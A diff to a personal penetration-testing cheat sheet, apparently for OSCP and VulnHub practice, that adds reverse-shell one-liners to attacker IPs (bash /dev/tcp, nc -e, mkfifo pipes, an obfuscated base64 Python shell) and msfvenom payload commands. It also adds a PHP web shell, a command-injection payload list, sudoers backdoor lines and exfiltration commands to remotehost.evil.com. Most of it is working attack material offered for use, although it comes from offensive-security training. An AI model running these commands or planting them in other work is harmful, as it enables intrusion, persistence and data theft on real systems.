@@ -1,5 +1,18 @@
 # Links
 
+https://quickref.me/
+
+
+https://lzone.de/
+
+
+https://github.com/Ignitetechnologies/Vulnhub-CTF-Writeups
+
+https://www.mrb3n.com
+
+https://emaragkos.gr/recommended-machines/
+
+
 https://fareedfauzi.gitbook.io/oscp-notes/
 
 https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
@@ -134,7 +147,8 @@ for i in $(seq 1 65535); do nc -nvz -w 1 192.168.212.4 $i 2>&1; done | grep -v "
 
 ## open port outbound
 
-    #Top ports nmap -oG - -v --top-ports 10
+    # Top ports 
+    nmap -oG - -v --top-ports 10
     bttai@debian:~/OSCP/boxes/sickos$ cat ping.sh 
     ports="21 22 23 25 80 110 443 8080 8443"
     for port in $(seq 0 9000); do
@@ -302,28 +316,8 @@ $ nmap -p25 --script smtp-enum-users $ip
 
  /usr/share/legion/scripts/smtp-user-enum.pl -M VRFY -U users.txt -t 192.168.110.63
 
-## sed
 
-
-```console
-
-# garder seulement le texte entre <pre> text </pre>
-sed 's/<pre>/<pre>\n/g' 
-sed -n '/<xxxxx/,/<\/xxxxx/p'
-sed -n '/<div id="footer"/,/<\/div/p'
-# delete @ at the begining of lines
-sed 's/^@\(.*\)/\1/' 
-# Supprimer toutes les balises
-sed -e 's/<[^>]*>//g'
-sed 's/<\/\?[^>]\+>//g'
-# Supprimer la première ligne et la dernière ligne
-sed -r -e '1d' -e '$d' -e 's/^\s+//'
-# Supprimer tout sauf entre 2 balises
-sed '/<div class="content">/,/<\/div>/!d'
-sed -n '/<div class="content">/,/<\/div/p'
-```
-
-curl
+## curl
 
 Tar file
     # create
@@ -732,6 +726,9 @@ pspy : https://github.com/DominicBreuker/pspy it allows you to see commands run 
 
 ```bash
 
+find / '(' -type f -or -type d ')' '(' '(' -user www-data ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | sort | uniq
+find / '(' -type f -or -type d ')' -group www-data -perm -g=w 2>/dev/null| grep -v '/proc/' | sort | uniq
+
 find / -perm -u=s -type f  2>/dev/null | xargs ls -l
 find / -perm -g=s -type f 2>/dev/null| xargs ls -l
 
@@ -788,6 +785,7 @@ find / -type f -name user.txt -exec cat {} \; 2> /dev/null
 
     # without netcat
     /bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
+    /bin/bash -i &> /dev/tcp/<attacker_ip>/<port> 0>&1
 
     # use  telnet
     mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
@@ -803,6 +801,8 @@ find / -type f -name user.txt -exec cat {} \; 2> /dev/null
     
     # PHP reverse shell via interactive console
     wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php
+
+    <?php passthru($_GET['lqIdA5']);?>
 
     # socat
     # attacker
@@ -844,14 +844,19 @@ https://www.hackingarticles.in/generating-reverse-shell-using-msfvenom-one-liner
     msfvenom -p cmd/unix/reverse_python lhost=192.168.1.1 lport=443 R
     python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAgICAgLCAgICBzdWJwcm9jZXNzICAgICAgICAsICAgIG9zICAgICA7ICAgIGhvc3Q9IjE5Mi4xNjguMS4xIiAgICAgOyAgICBwb3J0PTQ0MyAgICAgOyAgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgICAgICAgICwgICAgc29ja2V0LlNPQ0tfU1RSRUFNKSAgICAgOyAgICBzLmNvbm5lY3QoKGhvc3QgICAgICAgICwgICAgcG9ydCkpICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgLCAgICAwKSAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICwgICAgMSkgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAsICAgIDIpICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==')[0]))"
 
-    msfvenom -p cmd/unix/reverse_netcat lhost <attacker_ip> lpost <port> R
-    mkfifo /tmp/ffvdua; nc 192.168.0.13 443 0</tmp/ffvdua | /bin/sh >/tmp/ffvdua 2>&1; rm /tmp/ffvdua
     
-    msfvenom -p cmd/unix/reverse_bash lhost <attacker_ip> lpost <port> R
-    0<&21-;exec 21<>/dev/tcp/192.168.0.13/443;sh <&21 >&21 2>&21
+    msfvenom -a cmd --platform unix -p cmd/unix/reverse_bash LHOST=192.168.110.1 LPORT=4444 R
+    bash -c '0<&128-;exec 128<>/dev/tcp/192.168.110.1/4444;sh <&128 >&128 2>&128'
+
     
-    msfvenom -p cmd/unix/reverse_netcat_gaping lhost=192.168.1.1 lport=443 R
-    nc 192.168.0.13 443 -e /bin/sh
+    msfvenom --platform unix -a cmd -p cmd/unix/reverse_netcat lhost=192.168.110.1 lport=4444 R
+    mkfifo /tmp/qgzh; nc 192.168.110.1 4444 0</tmp/qgzh | /bin/sh >/tmp/qgzh 2>&1; rm /tmp/qgzh
+
+
+    
+    msfvenom -a cmd --platform unix -p cmd/unix/reverse_netcat_gaping lhost=192.168.110.1 lport=443 R
+    nc 192.168.110.1 443 -e /bin/sh
+
 
     msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
     cmd/unix/bind_awk
@@ -915,8 +920,10 @@ https://www.hackingarticles.in/generating-reverse-shell-using-msfvenom-one-liner
     msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o rev &>/dev/null
     msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -a x64 --platform linux -f elf -o rev
     msfvenom --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.110.1 LPORT=4444 -f elf -a x86 -o rev
+    #Payload options (linux/x86/meterpreter/reverse_tcp):
 
     #Tomcat
+
     msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.1 LPORT=1234 -f war > update.war
     msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f war -o evil.war
 
@@ -1558,6 +1565,9 @@ https://github.com/rebootuser
 
 
 
+    $ msfvenom -p cmd/unix/reverse_netcat lhost=192.168.56.1 lport=8888  R
+    mkfifo /tmp/vvvhm; nc 192.168.56.1 8888 0</tmp/vvvhm | /bin/sh >/tmp/vvvhm 2>&1; rm /tmp/vvvhm
+
 
 # Escape jail
 
@@ -1735,6 +1745,43 @@ print input11
 ```
 
 
+# Command injection
+
+    ;
+    &
+    &&
+    |
+    ||
+    ;
+    0x0a, \n
+    `command`
+    $(command)
+    ; command ;
+    ;; command ;;
+    Test with basic commands : pwd, ls, netcat, ssh, wget, ping, traceroute, cat, nc, cd, touch, echo, rm, mv
+
+    #Both Unix and Windows supported
+
+
+
+    #Both Unix and Windows supported
+    ls||id; ls ||id; ls|| id; ls || id # Execute both
+    ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
+    ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
+    ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
+    ls %0A id # %0A Execute both (RECOMMENDED)
+
+    #Only unix supported
+    `ls` # ``
+    $(ls) # $()
+    ls; id # ; Chain commands
+
+    #Not execute but may be interesting
+    > /var/www/html/out.txt #Try to redirect the output to a file
+    < /etc/passwd #Try to send some input to the command
+
+
+
 
 # Buffers overflow
 
@@ -1762,8 +1809,6 @@ objdump -d tfc |grep ".plt"
 
 
 
-
-
 ### exfiltration
 
 <http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html>
@@ -1780,3 +1825,17 @@ tar zcf - localfolder | base64 | dd conv=ebcdic >/dev/tcp/remotehost.evil.com/44
 tar zcf - localfolder | xxd -p -c 16 | while read line; do ping -p $line -c 1 -q remotehost.evil.com; done
 
 ```
+
+
+# /etc/sudoers
+
+
+    echo "blumbergh ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+    echo "peter ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+
+
+
+# teamviewer
+
+
+https://askubuntu.com/questions/1322937/ubuntu-20-04-shows-a-black-screen-when-connecting-through-teamviewer-but-i-stil
